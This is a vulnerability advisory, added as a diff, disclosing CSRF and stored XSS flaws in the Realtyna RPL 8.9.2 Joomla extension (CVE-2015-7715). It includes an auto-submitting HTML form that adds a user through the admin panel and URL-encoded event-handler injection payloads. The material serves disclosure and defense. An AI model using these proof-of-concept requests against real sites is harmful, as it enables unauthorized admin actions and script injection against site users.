@@ -1,0 +1,74 @@
+Realtyna RPL 8.9.2 Joomla Extension Persistent XSS And CSRF Vulnerabilities
+
+
+Vendor: Realtyna LLC
+Product web page: https://www.realtyna.com
+Affected version: 8.9.2
+
+Summary: Realtyna CRM (Client Relationship Management) Add-on
+for RPL is a Real Estate CRM specially designed and developed
+based on business process and models required by Real Estate
+Agents/Brokers. Realtyna CRM intends to increase the Conversion
+Ratio of the website Visitors to Leads and then Leads to Clients.
+
+
+Desc: The application allows users to perform certain actions
+via HTTP requests without performing any validity checks to
+verify the requests. This can be exploited to perform certain
+actions with administrative privileges if a logged-in user visits
+a malicious web site. Multiple cross-site scripting vulnerabilities
+were also discovered. The issue is triggered when input passed
+via the multiple parameters is not properly sanitized before
+being returned to the user. This can be exploited to execute
+arbitrary HTML and script code in a user's browser session in
+context of an affected site.
+
+Tested on: Apache
+           PHP/5.4.38
+		   MySQL/5.5.42-cll
+
+Vulnerability discovered by Bikramaditya 'PhoenixX' Guha
+
+
+Advisory ID: ZSL-2015-5271
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5271.php
+Vendor: http://rpl.realtyna.com/Change-Logs/RPL7-Changelog
+CVE ID: CVE-2015-7715
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7715
+
+
+05.10.2015
+
+--
+
+
+1. CSRF:
+
+<html lang="en">
+<head>
+<title>CSRF POC</title>
+</head>
+<body>
+<form action="http://localhost/administrator/index.php" id="formid" method="post">
+<input type="hidden" name="option" value="com_rpl" />
+<input type="hidden" name="view" value="addon_membership_members" />
+<input type="hidden" name="format" value="ajax" />
+<input type="hidden" name="function" value="add_user" />
+<input type="hidden" name="id" value="85" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
+
+
+2. Cross Site Scripting (Stored):
+
+http://localhost/administrator/index.php
+POST parameters: new_location_en_gb, new_location_fr_fr
+
+Payloads:
+
+option=com_rpl&view=location_manager&format=ajax&new_location_en_gb=%22onmousemove%3D%22alert(1)%22%22&new_location_fr_fr=&level=1&parent=&function=add_location
+option=com_rpl&view=location_manager&format=ajax&new_location_en_gb=&new_location_fr_fr=%22onmousemove%3D%22alert(2)%22%22&level=1&parent=&function=add_location
